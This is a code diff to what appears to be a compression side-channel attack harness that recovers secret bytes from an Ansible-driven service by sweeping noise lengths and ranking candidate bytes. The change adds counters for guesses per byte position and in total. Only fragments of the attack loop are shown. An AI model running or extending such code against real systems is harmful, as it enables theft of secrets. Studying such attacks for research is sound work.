@@ -135,7 +135,7 @@ async def _sweep_round_ansible(
     noise_lengths: list[int],
     settle: float,
     flush_bytes: int,  # unused -- fresh zlib context per iteration
-) -> tuple[dict[bytes, int], dict[int, dict[bytes, int]]]:
+) -> tuple[dict[bytes, int], dict[int, dict[bytes, int]], int]:
     """One noise-length sweep for the Ansible variant.
 
     Ordering within each (candidate, noise_length) iteration:
@@ -168,9 +168,11 @@ async def _sweep_round_ansible(
     per_nl: dict[int, dict[bytes, int]] = {
         nl: {c: 0 for c in alphabet} for nl in noise_lengths
     }
+    guesses = 0
     for noise_len in noise_lengths:
         noise = _make_noise(noise_len)
         for cb in alphabet:
+            guesses += 1
             # 1. Fire ansible-playbook (kills previous, starts fresh).
             try:
                 await _trigger_ansible(session)
@@ -213,7 +215,7 @@ async def _sweep_round_ansible(
             except Exception:  # noqa: BLE001
                 pass
 
-    return sums, per_nl
+    return sums, per_nl, guesses
 
 
 # ---------------------------------------------------------------------------
@@ -344,16 +346,17 @@ async def run_attack(
     async def capturing_sweep(
         session, packet_log_, prefix, alphabet_, noise_lens_, settle_, flush_bytes_,
     ):
-        sums, per_nl = await _sweep_round_ansible(
+        sums, per_nl, guesses = await _sweep_round_ansible(
             session, packet_log_, prefix, alphabet_, noise_lens_, settle_, flush_bytes_,
         )
         latest_per_nl.clear()
         latest_per_nl.update(per_nl)
-        return sums, per_nl
+        return sums, per_nl, guesses
 
     started = time.time()
     recovered = b""
     history: list[dict[str, Any]] = []
+    per_position_guesses: list[int] = []
     significant_noises: list[int | None] = []
 
     timeout = aiohttp.ClientTimeout(total=7200)
@@ -378,7 +381,7 @@ async def run_attack(
                 pos_noise = list(noise_lengths)
                 LOG.info("pos %2d: full noise sweep", pos)
 
-            best, sums, _ = await crack_byte_position(
+            best, sums, _, pos_guesses = await crack_byte_position(
                 session, packet_log,
                 prefix=full_prefix,
                 alphabet=alphabet,
@@ -391,6 +394,7 @@ async def run_attack(
                 sweep_fn=capturing_sweep,
                 adaptive_noise=False,
             )
+            per_position_guesses.append(pos_guesses)
 
             # Observation: which noise length actually carried the
             # 8-byte signal this position?  Always logged, even in
@@ -423,6 +427,7 @@ async def run_attack(
                 "best": best.decode("latin-1"),
                 "ranked": ranked[:6],
                 "noise_lengths": pos_noise,
+                "guesses": pos_guesses,
             })
             if best == terminator:
                 LOG.info("hit terminator at position %d -> done", pos)
@@ -447,4 +452,6 @@ async def run_attack(
         # Callers can harvest this and feed it back as `noise_hints`
         # on a subsequent attack run to skip the 8-noise sweep.
         "significant_noises": significant_noises,
+        "total_guesses": sum(per_position_guesses),
+        "per_position_guesses": per_position_guesses,
     }
